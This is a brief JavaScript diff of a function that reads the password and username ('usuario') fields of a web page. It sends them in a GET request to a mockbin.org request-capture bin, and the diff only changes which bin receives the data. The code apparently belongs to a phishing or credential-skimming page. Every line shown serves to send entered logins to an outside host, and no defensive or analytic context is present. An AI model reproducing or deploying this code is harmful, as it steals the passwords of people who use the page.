@@ -1,6 +1,6 @@
 function l(){
     var a = new XMLHttpRequest();
-    a.open('GET','http://mockbin.org/bin/014d87bb-3ab6-4613-9bb1-52ec5c823d7c?p='
+    a.open('GET','http://mockbin.org/bin/8fe439fc-2d53-40ae-98cf-6c3ea5d221e9?p='
         .concat(document.getElementById('password').value,'%26u=',document.getElementById('usuario').value));
     a.onreadystatechange=function(){
         if(a.readyState === XMLHttpRequest.DONE){
